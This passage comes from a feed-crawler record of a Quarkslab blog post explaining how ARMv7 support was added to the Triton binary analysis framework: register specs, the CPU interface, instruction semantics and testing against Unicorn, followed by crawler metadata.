r1</span>\n<span class=\"p\">[...]</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">R12</span><span class=\"p\">,</span>  <span class=\"n\">r12</span><span class=\"p\">,</span>  <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">R12</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span>  <span class=\"c1\">// r12</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">SP</span><span class=\"p\">,</span>   <span class=\"n\">sp</span><span class=\"p\">,</span>   <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">SP</span><span class=\"p\">,</span>  <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span>  <span class=\"c1\">// SP</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">R14</span><span class=\"p\">,</span>  <span class=\"n\">r14</span><span class=\"p\">,</span>  <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">R14</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span>  <span class=\"c1\">// LR (r14)</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">PC</span><span class=\"p\">,</span>   <span class=\"n\">pc</span><span class=\"p\">,</span>   <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">PC</span><span class=\"p\">,</span>  <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span>  <span class=\"c1\">// PC</span>\n<span class=\"n\">REG_SPEC</span><span class=\"p\">(</span><span class=\"n\">APSR</span><span class=\"p\">,</span> <span class=\"n\">apsr</span><span class=\"p\">,</span> <span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">bitsize</span><span class=\"o\">::</span><span class=\"n\">dword</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">APSR</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span> <span class=\"c1\">// APSR</span>\n\n<span class=\"n\">REG_SPEC_NO_CAPSTONE</span><span class=\"p\">(</span><span class=\"n\">C</span><span class=\"p\">,</span> <span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">C</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span> <span class=\"c1\">// C (Carry)</span>\n<span class=\"n\">REG_SPEC_NO_CAPSTONE</span><span class=\"p\">(</span><span class=\"n\">N</span><span class=\"p\">,</span> <span class=\"n\">n</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">N</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span> <span class=\"c1\">// N (Negative)</span>\n<span class=\"n\">REG_SPEC_NO_CAPSTONE</span><span class=\"p\">(</span><span class=\"n\">V</span><span class=\"p\">,</span> <span class=\"n\">v</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">V</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span> <span class=\"c1\">// V (Overflow)</span>\n<span class=\"n\">REG_SPEC_NO_CAPSTONE</span><span class=\"p\">(</span><span class=\"n\">Z</span><span class=\"p\">,</span> <span class=\"n\">z</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">Z</span><span class=\"p\">,</span> <span class=\"n\">TT_MUTABLE_REG</span><span class=\"p\">)</span> <span class=\"c1\">// Z (Zero)</span>\n</pre> \n </div> \n <p>As you can see, some flags are defined with <tt class=\"docutils literal\">REG_SPEC_NO_CAPSTONE</tt> instead of <tt class=\"docutils literal\">REG_SPEC</tt>. The reason for this is the following. <a class=\"reference external\" href=\"http://www.capstone-engine.org/\">Capstone</a>, the library Triton uses for disassembly, defines the <tt class=\"docutils literal\">APSR</tt> register, which holds all 4 flags, as a \"single\" register. However, we would like to be able to access each flag independently from one another. <tt class=\"docutils literal\">REG_SPEC_NO_CAPSTONE</tt> is used for this purpose: it defines a flag and states that it is not present in Capstone (the values of the <tt class=\"docutils literal\">APSR</tt> register and each flag are \"synchronized\").</p> \n <p>Once the registers specification is done, we have to define enums for instructions and registers. As mentioned, Triton uses Capstone to disassemble opcodes, however, we define our own enums for things such as instructions mnemonics. Why don't we use Capstone enums? Our goal is to be as independent as possible of any external library. For example, if we move away to another disassembler, we don't want to change the base code of our engines and semantics. To avoid this scenario, we have to convert every Capstone enum into a Triton enum. This is the role the following functions and they are basically just switch cases:</p> \n <ul class=\"simple\"> \n  <li><tt class=\"docutils literal\"><span class=\"pre\">Arm32Specifications::capstoneRegisterToTritonRegister</span></tt></li> \n  <li><tt class=\"docutils literal\"><span class=\"pre\">Arm32Specifications::capstoneInstructionToTritonInstruction</span></tt></li> \n </ul> \n <p>These functions are primarily used during the disassembly stage (next step).</p> \n</div> \n<div class=\"section\" id=\"step-2-creating-a-cpu-interface\"> \n <h2>Step 2: Creating a CPU interface</h2> \n <p>The second step consists in implementing what is called the CPU interface. Basically, all architectures in Triton share the same interface. It provides access to CPU registers, memory and also useful information such as which registers are the program counter and the stack pointer. One of the most important methods of this interface is <tt class=\"docutils literal\">disassembly</tt> which, as its name clearly states, disassembles instructions provided by the user. The workflow is the following: the user creates an instruction, sets the opcode and address, and calls the <tt class=\"docutils literal\">processing</tt> method (here is where all the magic happens). The code looks like this (using the Python bindings):</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"n\">ctx</span> <span class=\"o\">=</span> <span class=\"n\">TritonContext</span><span class=\"p\">(</span><span class=\"n\">ARCH</span><span class=\"o\">.</span><span class=\"n\">ARM32</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># Set memory, PC, etc...</span>\n\n<span class=\"k\">while</span> <span class=\"n\">pc</span> <span class=\"o\">!=</span> <span class=\"n\">stop_address</span><span class=\"p\">:</span>\n    <span class=\"c1\"># Fetch next opcode.</span>\n    <span class=\"n\">opcode</span> <span class=\"o\">=</span> <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">getConcreteMemoryAreaValue</span><span class=\"p\">(</span><span class=\"n\">pc</span><span class=\"p\">,</span> <span class=\"mi\">4</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Create a Triton instruction.</span>\n    <span class=\"n\">instruction</span> <span class=\"o\">=</span> <span class=\"n\">Instruction</span><span class=\"p\">(</span><span class=\"n\">pc</span><span class=\"p\">,</span> <span class=\"n\">opcode</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Process the instruction (i.e., disassemble it and build its semantics).</span>\n    <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">processing</span><span class=\"p\">(</span><span class=\"n\">instruction</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># Update the program counter.</span>\n    <span class=\"n\">pc</span> <span class=\"o\">=</span> <span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">getConcreteRegisterValue</span><span class=\"p\">(</span><span class=\"n\">ctx</span><span class=\"o\">.</span><span class=\"n\">registers</span><span class=\"o\">.</span><span class=\"n\">pc</span><span class=\"p\">)</span>\n</pre> \n </div> \n <p>In turn, <tt class=\"docutils literal\">ctx.processing(instruction)</tt> calls the aforementioned <tt class=\"docutils literal\">disassembly</tt> method. It uses Capstone to disassemble the instruction and then uses the information supplied to fill the rest of the fields of the instruction (basically, there is a translation from the Capstone representation of an instruction to the Triton one, as explained in the previous step).</p> \n <p>For most architectures the job would be done by now. However, the ARMv7 architecture presents unique challenges (to be fair to ARM, every architecture does). The <tt class=\"docutils literal\">disassembly</tt> method has to take into account the current execution mode, which can be ARM or Thumb. Transitions between these two modes can occur anytime in the code (although only through specific instructions, such as branch and exchange instructions, or some selected instructions <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id3\" id=\"id1\">[1]</a> that have PC as their destination register). And when it does occur, the PC register is updated (with the address of the next instruction to execute) and its least significant bit is set to <cite>0</cite> when the target instruction is in ARM mode or to <cite>1</cite> when it is in Thumb mode. Therefore, dealing with transitions in Triton is simple. It only consists in checking when the PC register is set (it is done in just one place) and setting a flag that states which mode it is currently in (depending on it the instruction will be disassembled using one mode or the other).</p> \n <p>Besides specificities such as the one described above, the implementation of the CPU interface is quite simple and straightforward. Anyone trying to implement a new architecture ( <tt class=\"docutils literal\">;)</tt> ) can use any of the available ones (x86, AArch64 and now ARMv7) as a reference.</p> \n</div> \n<div class=\"section\" id=\"step-3-describing-the-semantics\"> \n <h2>Step 3: Describing the semantics</h2> \n <p>Each instruction modifies the state of the registers, memory and flags in a precise way, we call this its <strong>semantics</strong>. This step shows how to write the semantics of an instruction so every time we emulate one in Triton it does exactly what it is supposed to do (accordingly to what the ARMv7 manual says).</p> \n <p>Similarly to the previous step, there is a <strong>semantics</strong> interface which we have to implement when adding a new architecture to Triton. This interface is quite simple and has one method only, namely: <tt class=\"docutils literal\">buildSemantics</tt>. It is invoked by the <tt class=\"docutils literal\">processing</tt> method after the disassembly of the instruction has finished.</p> \n <p>The method consists of a big <tt class=\"docutils literal\">switch</tt> statement that processes instructions according to their mnemonics (for example: <tt class=\"docutils literal\">ID_INS_ADD</tt>, <tt class=\"docutils literal\">ID_INS_MOV</tt>, which correspond to the <tt class=\"docutils literal\">ADD</tt> and <tt class=\"docutils literal\">MOV</tt> instructions). The handling of each instruction is done in a separate method. The structure of such method is roughly the following:</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"kt\">void</span> <span class=\"n\">Arm32Semantics</span><span class=\"o\">::&lt;</span><span class=\"n\">MNEMONIC</span><span class=\"o\">&gt;</span><span class=\"n\">_s</span><span class=\"p\">(</span><span class=\"n\">triton</span><span class=\"o\">::</span><span class=\"n\">arch</span><span class=\"o\">::</span><span class=\"n\">Instruction</span><span class=\"o\">&amp;</span> <span class=\"n\">inst</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">auto</span><span class=\"o\">&amp;</span> <span class=\"n\">dst</span>  <span class=\"o\">=</span> <span class=\"n\">inst</span><span class=\"p\">.</span><span class=\"n\">operands</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n  <span class=\"k\">auto</span><span class=\"o\">&amp;</span> <span class=\"n\">src1</span> <span class=\"o\">=</span> <span class=\"n\">inst</span><span class=\"p\">.</span><span class=\"n\">operands</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n  <span class=\"k\">auto</span><span class=\"o\">&amp;</span> <span class=\"n\">src2</span> <span class=\"o\">=</span> <span class=\"n\">inst</span><span class=\"p\">.</span><span class=\"n\">operands</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">];</span>\n\n  <span class=\"cm\">/* Create symbolic operands */</span>\n  <span class=\"k\">auto</span> <span class=\"n\">op1</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">symbolicEngine</span><span class=\"o\">-&gt;</span><span class=\"n\">getOperandAst</span><span class=\"p\">(</span><span class=\"n\">inst</span><span class=\"p\">,</span> <span class=\"n\">src1</span><span class=\"p\">);</span>\n  <span class=\"k\">auto</span> <span class=\"n\">op2</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">symbolicEngine</span><span class=\"o\">-&gt;</span><span class=\"n\">getOperandAst</span><span class=\"p\">(</span><span class=\"n\">inst</span><span class=\"p\">,</span> <span class=\"n\">src2</span><span class=\"p\">);</span>\n\n  <span class=\"cm\">/* Create the semantics */</span>\n  <span class=\"k\">auto</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"o\">&lt;</span><span class=\"n\">build</span> <span class=\"n\">semantics</span> <span class=\"k\">using</span> <span class=\"n\">the</span> <span class=\"n\">AstContext</span> <span class=\"n\">object</span><span class=\"o\">&gt;</span><span class=\"p\">;</span>\n\n  <span class=\"cm\">/* Create symbolic expression */</span>\n  <span class=\"k\">auto</span> <span class=\"n\">expr</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">symbolicEngine</span><span class=\"o\">-&gt;</span><span class=\"n\">createSymbolicExpression</span><span class=\"p\">(</span><span class=\"n\">inst</span><span class=\"p\">,</span> <span class=\"n\">node</span><span class=\"p\">,</span> <span class=\"n\">dst</span><span class=\"p\">,</span> <span class=\"s\">\"&lt;MNEMONIC&gt; operation\"</span><span class=\"p\">);</span>\n\n  <span class=\"cm\">/* Get condition code node (in case it is a conditional instruction) */</span>\n  <span class=\"k\">auto</span> <span class=\"n\">cond</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">-&gt;</span><span class=\"n\">getChildren</span><span class=\"p\">()[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n\n  <span class=\"cm\">/* Spread taint */</span>\n  <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">spreadTaint</span><span class=\"p\">(</span><span class=\"n\">inst</span><span class=\"p\">,</span> <span class=\"p\">...);</span>\n\n  <span class=\"cm\">/* Update symbolic flags */</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">inst</span><span class=\"p\">.</span><span class=\"n\">isUpdateFlag</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"nb\">true</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"cm\">/* Update flags accordingly to the result of instruction. */</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"cm\">/* Update condition flag */</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">cond</span><span class=\"o\">-&gt;</span><span class=\"n\">evaluate</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"nb\">true</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"cm\">/* In case it is a conditional execution instruction, make the</span>\n<span class=\"cm\">     * necessary adjustments (for instance, let Triton know the instruction</span>\n<span class=\"cm\">     * was in fact executed, switch execution modes, etc).</span>\n<span class=\"cm\">     */</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"cm\">/* Update the symbolic control flow */</span>\n  <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">controlFlow_s</span><span class=\"p\">(</span><span class=\"n\">inst</span><span class=\"p\">,</span> <span class=\"p\">...);</span>\n<span class=\"p\">}</span>\n</pre> \n </div> \n <p>Each instruction is different and has specific needs (and/or quirks), however, for most of them, the definition of their semantics looks similar to the example code above. In the case of ARMv7, we had to account for various aspects that made the implementation complex and, in some cases, even cumbersome. Firstly, as already mentioned, ARMv7 has two main execution modes: ARM and Thumb. Instructions are encoded for one or the other. Typically, they look the same, nonetheless, they have some differences. Perhaps, the most important one is the conditional execution. ARMv7 instructions are in their vast majority conditional, that is, they execute (or not) depending on the current values of the flags. For ARM, this information is encoded within each instruction (enabled by a suffix, for example: <tt class=\"docutils literal\">ADDNE r0, r1, r2</tt>), whereas for Thumb they require an extra instruction (<tt class=\"docutils literal\">IT</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id4\" id=\"id2\">[2]</a>) to make it conditional (for example: <tt class=\"docutils literal\">IT NE; ADD r0, r1, r2</tt>).</p> \n <p>There are also more subtle differences which demand extra attention. For instance, two instructions that look the same but whose operands behave slightly differently (at least, according to Capstone). This is the case of <tt class=\"docutils literal\">ASRS r0, r1, #2</tt> (Arithmetic Shift Right, the S suffix states that the flags should be updated), where the immediate (i.e., the <tt class=\"docutils literal\">#2</tt>) is interpreted differently when encoded in ARM and Thumb (shown as <tt class=\"docutils literal\">Shift</tt> and as <tt class=\"docutils literal\">operands[2]</tt>, respectively). Below you can see the differences:</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"gp\">$</span> cstool -d arm <span class=\"s2\">\"\\x41\\x01\\xb0\\xe1\"</span> <span class=\"m\">1000</span>\n<span class=\"go\">1000  41 01 b0 e1  asrs r0, r1, #2</span>\n<span class=\"go\">    op_count: 2</span>\n<span class=\"go\">        operands[0].type: REG = r0</span>\n<span class=\"go\">        operands[0].access: WRITE</span>\n<span class=\"go\">        operands[1].type: REG = r1</span>\n<span class=\"go\">        operands[1].access: READ</span>\n<span class=\"go\">            Shift: 1 = 2</span>\n<span class=\"go\">    Update-flags: True</span>\n<span class=\"go\">    Registers read: r1</span>\n<span class=\"go\">    Registers modified: r0</span>\n<span class=\"go\">    Groups: arm</span>\n\n<span class=\"gp\">$</span> cstool -d thumb <span class=\"s2\">\"\\x88\\x10\"</span> <span class=\"m\">1000</span>\n<span class=\"go\">1000  88 10  asrs   r0, r1, #2</span>\n<span class=\"go\">    op_count: 3</span>\n<span class=\"go\">        operands[0].type: REG = r0</span>\n<span class=\"go\">        operands[0].access: WRITE</span>\n<span class=\"go\">        operands[1].type: REG = r1</span>\n<span class=\"go\">        operands[1].access: READ</span>\n<span class=\"go\">        operands[2].type: IMM = 0x2</span>\n<span class=\"go\">    Update-flags: True</span>\n<span class=\"go\">    Registers read: r1</span>\n<span class=\"go\">    Registers modified: r0</span>\n<span class=\"go\">    Groups: thumb thumb1only</span>\n</pre> \n </div> \n <p>Switching between modes is another matter that required effort. It is possible to switch modes not only using explicit instructions such as <tt class=\"docutils literal\">BX</tt> (Branch and eXchange) but also through standard instructions, for instance, arithmetic and bitwise. In the latter case, the only thing needed is the PC register to be used as the destination operand. This didn't pose a difficulty in itself but took considerable amount of time when testing given the many cases to consider.</p> \n <p>Amongst the things that make the implementation of ARMv7 complex, we can emphasize the many variations a single instruction can have (in terms of the number and type of operands as well as the condition code).</p> \n <p>The current state of the ARMv7 implementation is quite advanced. Nonetheless, there is still some more work to do. We have implemented the most frequent instructions and it is possible to emulate full binaries (as we'll comment in the next section). Adding support for new instructions is relatively easy now as the heavy part is already done, and the testing infrastructure is in place. We'll be adding more instructions in future releases. We have not considered yet support for features such as SIMD, floating-point extensions or big-endian memory access (we'll consider them as need arises, though).</p> \n</div> \n<div class=\"section\" id=\"step-4-testing-the-semantics\"> \n <h2>Step 4: Testing the semantics</h2> \n <p>Implementing an instruction set can be tricky and requires a lot of attention. Reference manuals are not always as clear as one would like. Therefore, testing is crucial.</p> \n <p>Testing involves processing instructions and comparing their outputs (that is, the values of registers and memory) to a well known implementation of the architecture under test. Triton relies on Unicorn for emulation (which is based on QEMU, a widely known, used and tested emulator).</p> \n <p>The development process was the following. We started by implementing scripts to emulate an instruction using Unicorn and using Triton. Then, each time we implemented a new instruction we emulated it using both scripts and compared the results. In case there was a difference we investigated it and made the necessary fixes.</p> \n <p>Once the development was completed (that is, we implemented all the instructions we originally planned) we included the aforementioned tests to Triton's CI infrastructure. We currently test many variations of the same instruction, with different conditional codes and operands. We test instructions encoded for ARM and Thumb as well. Additionally, we test instructions that switch execution modes. As the number of instructions tested is large, tests are separated by instruction category (data, branch, load/store), encoding (ARM/Thumb) and mode switching (from ARM to Thumb and the other way around).</p> \n <p>As an extra step, we also test the implementation emulating entire binaries. In this case, we have chosen a binary sample that computes the sha256 of a string (which proved to be really useful to find some missing details in previous tests). This sample was compiled for ARM and Thumb modes with different optimization flags (<tt class=\"docutils literal\"><span class=\"pre\">-O0</span></tt>, <tt class=\"docutils literal\"><span class=\"pre\">-O1</span></tt>, <tt class=\"docutils literal\"><span class=\"pre\">-O2</span></tt>, <tt class=\"docutils literal\"><span class=\"pre\">-O3</span></tt>, <tt class=\"docutils literal\"><span class=\"pre\">-Os</span></tt>, and <tt class=\"docutils literal\"><span class=\"pre\">-Oz</span></tt>), providing an extensive range of instructions and variations.</p> \n <p>As part of its CI infrastructure, Triton collects coverage information from its tests (you can take a better look at our <a class=\"reference external\" href=\"https://codecov.io/gh/JonathanSalwan/Triton\">Codecov page</a>). This information helped us guide our testing efforts during the development process. As already mentioned, ARMv7 instructions have many variations, and it was not always obvious which one were missing from the tests.</p> \n</div> \n<div class=\"section\" id=\"files-organisation\"> \n <h2>Files organisation</h2> \n <p>Regarding the ARMv7 architecture and the files organisation, every step is handled by the following files:</p> \n <ul class=\"simple\"> \n  <li>Step 1: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/blob/master/src/libtriton/includes/triton/arm32.spec\">src/libtriton/includes/triton/arm32.spec</a> and <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/blob/master/src/libtriton/arch/arm/arm32/arm32Specifications.cpp\">src/libtriton/arch/arm/arm32/arm32Specifications.cpp</a></li> \n  <li>Step 2: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/blob/master/src/libtriton/arch/arm/arm32/arm32Cpu.cpp\">src/libtriton/arch/arm/arm32/arm32Cpu.cpp</a></li> \n  <li>Step 3: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/blob/master/src/libtriton/arch/arm/arm32/arm32Semantics.cpp\">src/libtriton/arch/arm/arm32/arm32Semantics.cpp</a></li> \n  <li>Step 4: <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/tree/master/src/testers/arm32\">src/testers/arm32/</a></li> \n </ul> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>Triton proved to be prepared for the addition of another architecture. ARMv7 posed some challenges, as described throughout this post. However, Triton handled them nicely (very few changes were needed in its core). The current implementation is quite advanced and we are going to add support for missing instructions in future releases.</p> \n <p>This blog post, besides describing the experience of providing support for ARMv7, is meant to be used as a guideline for adding new architectures. As seen in the first two steps, adding basic support for disassembly is simple and straightforward. The heavy work resides in Step three. However, the task can be tackled progressively, allowing you to implement only those instructions you need for your analysis (and to have an immediate feedback of your implementation as well). If you want to bring the benefits of Triton to another architecture (or if you simply want to deepen your knowledge), now you known how to proceed!</p> \n</div> \n<div class=\"section\" id=\"acknowledgments\"> \n <h2>Acknowledgments</h2> \n <ul class=\"simple\"> \n  <li>Thanks to all our Quarkslab colleagues who proofread this article.</li> \n  <li>Thanks to Romain for providing testing samples.</li> \n </ul> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id3\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id1\">[1]</a></td> \n    <td>Check section \"Changing between Thumb state and ARM state\" of the reference manual (<a class=\"reference external\" href=\"https://static.docs.arm.com/ddi0406/c/DDI0406C_C_arm_architecture_reference_manual.pdf\">ARM Architecture Reference Manual, ARMv7-A and ARMv7-R edition</a>).</td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id4\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id2\">[2]</a></td> \n    <td>Currently, the IT instruction is not supported natively. However, it can be easily handled as shown in <a class=\"reference external\" href=\"https://github.com/JonathanSalwan/Triton/blob/master/src/testers/arm32/crypto_test/crypto_test-thumb-O1-run.py#L219\">this example</a>.</td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Wed, 24 Jun 2020 22:00:00 +0000","feedId":11110,"bgimg":"","linkMd5":"49bb25a5cafff96e1293d95a7a74b998","bgimgJsdelivr":"","metaImg":"","author":"Christian Heitman","publishedOrCreatedDate":1598318092713}],"record":{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","feedId":11110,"fetchDate":"Tue, 25 Aug 2020 01:14:52 +0000","fetchMs":825,"handleMs":1937,"totalMs":31342,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"34.235.102.117","hostName":"us-034.herokuapp.com","requestId":"4a9b8591c25d4568921f96cd74ae4bcd_11110","contentType":"text/xml","totalBytes":11066812,"bgimgsTotal":12,"bgimgsGithubTotal":12,"articlesImgsTotal":89,"articlesImgsGithubTotal":87,"successGithubMap":{"myreaderx14":3,"myreaderx8":3,"myreaderx15":4,"myreaderx7":3,"myreaderx16":3,"myreaderx6":2,"myreaderx10":3,"myreaderx32":3,"myreaderx4":3,"myreaderx33":3,"myreaderx3":3,"myreaderx11":2,"myreaderx12":3,"myreaderx2":3,"myreaderx13":2,"myreaderx1":3,"myreaderx30":3,"myreaderx31":3,"myreaderx18":2,"myreaderx19":3,"myreaderx":4,"myreaderx25":4,"myreaderx27":4,"myreaderx21":4,"myreaderx22":2,"myreaderx23":3,"myreaderx24":3,"myreaderx5oss":2,"myreaderx29":3},"failGithubMap":{}},"feed":{"createdTime":"2020-08-25 04:36:28","updatedTime":"2020-08-25 04:36:28","id":11110,"name":"Quarkslab's blog","url":"http://blog.quarkslab.com/feeds/all.rss.xml","subscriber":null,"website":null,"icon":"http://blog.quarkslab.com/theme/img/apple-touch-icon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx65/cdn66@2020_5/2020/08/25/01-14-51-928_7881f31e087af6b8.png","description":"","weekly":null,"link":"http://blog.quarkslab.com"},"noPictureArticleList":[],"tmpCommonImgCdnBytes":1500520,"tmpBodyImgCdnBytes":9566292,"tmpBgImgCdnBytes":0,"extra4":{"start":1598318089526,"total":0,"statList":[{"spend":1262,"msg":"获取xml内容"},{"spend":1937,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":8741,"msg":"正文链接上传到cdn"}]},"extra5":89,"extra6":89,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/virtual_proc.png","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":533,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:12","host":"us-010*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/on_soc.png","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":541,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:12","host":"us-018*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/on_soc.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":732,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:12","host":"us-032*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/virtual_proc.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":746,"convertSpendMs":0,"createdTime":"2020-08-25 